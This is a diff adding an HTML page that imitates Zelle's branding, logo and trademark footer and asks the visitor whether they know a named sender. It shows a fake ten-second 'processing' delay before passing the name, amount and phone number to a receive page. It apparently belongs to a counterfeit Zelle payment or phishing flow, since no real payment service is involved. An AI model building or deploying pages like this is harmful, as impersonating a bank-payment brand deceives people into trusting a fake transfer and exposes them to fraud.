@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        /* Reset default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Full viewport setup */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #6d1ed4; /* Purple background */
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Zelle logo styling */
+        .zelle-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 100px; /* Adjust as needed */
+            height: auto;
+        }
+
+        /* Main container */
+        .container {
+            text-align: center;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        /* Heading styling */
+        h1, #receiver-name-display { /* Added h1 selector */
+            font-size: 24px;
+            margin-bottom: 10px; /* Added margin for spacing */
+            color: white;
+        }
+
+        /* Button container */
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        /* Button styling */
+        .btn {
+            background-color: #6d1ed4;
+            color: white;
+            font-size: 16px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background-color: #5115b8;
+        }
+
+        .btn:active {
+            background-color: #3d0c8b;
+        }
+
+        /* Responsive styles */
+        @media (max-width: 400px) {
+            .buttons {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+
+            .zelle-logo {
+                width: 200px; /* Adjust as needed */
+            }
+        }
+        footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: white;
+            text-align: center;
+            padding: 20px; /* Increased padding */
+            font-size: 16px; /* Increased font size */
+        }
+        #loading-message {
+            margin-top: 20px;
+            font-style: italic;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <!-- Zelle Logo -->
+    <img src="zellelogo.jpg" alt="Zelle Logo" class="zelle-logo">
+
+    <div class="container">
+        <p id="receiver-name-display"></p>
+        <h1>Do you know <span id="name-display"></span>?</h1>
+        <div class="buttons">
+            <a id="yes-link" class="btn">Yes</a>
+            <a href="index.html" class="btn">No</a>
+        </div>
+        <div id="loading-message"></div>
+    </div>
+
+    <footer>
+        ©2025 Early Warning Services, LLC. All rights reserved. Zelle and the Zelle marks used herein are trademarks of Early Warning Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", async function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('session');
+
+            if (!sessionId) {
+                document.getElementById('name-display').textContent = "Session ID not found";
+                return;
+            }
+
+            const data = localStorage.getItem(sessionId);
+
+            if (data) {
+                const parsedData = JSON.parse(data);
+                document.getElementById('name-display').textContent = parsedData.name;
+                const amount = parsedData.amount;
+                const phone = parsedData.phone;
+                const yesLink = `receive.html?name=${encodeURIComponent(parsedData.name)}&amount=${encodeURIComponent(amount)}&phone=${encodeURIComponent(phone)}`;
+
+                document.getElementById('receiver-name-display').textContent = `Hi ${parsedData.receiverName}`;
+                document.getElementById('yes-link').addEventListener('click', function(event) {
+                    event.preventDefault(); // Prevent immediate navigation
+                    document.getElementById('loading-message').textContent = "Processing... Please wait.";
+                    setTimeout(() => {
+                        window.location.href = yesLink;
+                    }, 10000); // 10000 milliseconds = 10 seconds
+                });
+            } else {
+                document.getElementById('name-display').textContent = "Data not found";
+            }
+        });
+    </script>
+</body>
+</html>
